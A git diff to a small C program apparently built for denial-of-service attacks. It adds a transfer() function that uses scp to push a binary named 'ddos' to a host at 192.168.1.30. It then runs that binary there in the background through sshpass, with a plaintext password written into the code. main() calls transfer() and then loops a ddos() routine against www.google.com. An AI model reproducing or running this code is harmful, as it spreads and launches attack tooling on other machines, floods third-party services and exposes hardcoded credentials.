@@ -27,6 +27,23 @@ void displayTextArt() {
 }
 
 
+void transfer(void){
+    const char *local_path = "/root/Bureau/ddos";
+    const char *remote_path = "cyrille@192.168.1.30:/tmp/";
+    const char *scp_command = "scp -P 22 %s %s";
+    const char *remote_command = "sshpass -p AZERTY1234 ssh -p 22 cyrille@192.168.1.30 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1 && exit'";
+
+
+    char command[512];
+    snprintf(command, sizeof(command), scp_command, local_path, remote_path);
+
+    system(command);
+
+    int result = system(remote_command);
+    if (result == -1) {
+        printf("Error with the execution of the remote command.\n");
+    }
+}
 
 
 void ddos(const char *hostname, int index, int total) {
@@ -58,12 +75,14 @@ void ddos(const char *hostname, int index, int total) {
 }
 
 int main(void) {
+
+    transfer();
     struct addrinfo hints;
     struct addrinfo *result;
 
     const char *hostname = "www.google.com";
 
-    displayTextArt(); //comment for testing git cmd line
+    displayTextArt();
 
     memset(&hints, 0, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
@@ -75,7 +94,7 @@ int main(void) {
         printf("DNS exists.\n");
         freeaddrinfo(result);
 
-        int Calls = 10000;
+        int Calls = 20;
         for (int i = 1; i <= Calls; i++) {
             ddos(hostname, i, Calls);
         }
@@ -85,4 +104,5 @@ int main(void) {
     else {
         printf("DNS doesn't exist or may have a problem\n");
     }
+
 }
